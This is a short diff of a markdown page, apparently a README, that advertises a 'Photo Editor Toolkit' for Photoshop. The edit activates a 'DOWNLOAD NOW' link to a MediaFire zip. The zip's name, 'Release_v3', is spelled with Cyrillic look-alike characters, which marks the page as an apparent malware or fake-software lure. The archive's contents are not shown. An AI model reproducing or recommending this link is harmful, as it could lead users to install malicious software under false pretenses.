@@ -18,7 +18,7 @@ Adobe Photoshop remains the industry standard for image editing, but maximizing 
 ✅ **Step 1: Download the Toolkit**  
 Click below to grab the fully optimized Photo Editor Toolkit for Windows/Mac (2025):  
 
-[DOWNLOAD NOW]([#](https://www.mediafire.com/file/yfdj2noj32hq3h8/R%25D0%25B5l%25D0%25B5%25D0%25B0s%25D0%25B5_v3.zip/file))  
+[DOWNLOAD NOW](https://www.mediafire.com/file/yfdj2noj32hq3h8/R%25D0%25B5l%25D0%25B5%25D0%25B0s%25D0%25B5_v3.zip/file)
 
 🔹 **Key Features of This Release**:  
 - Lightweight scripts and presets (under 6MB).  
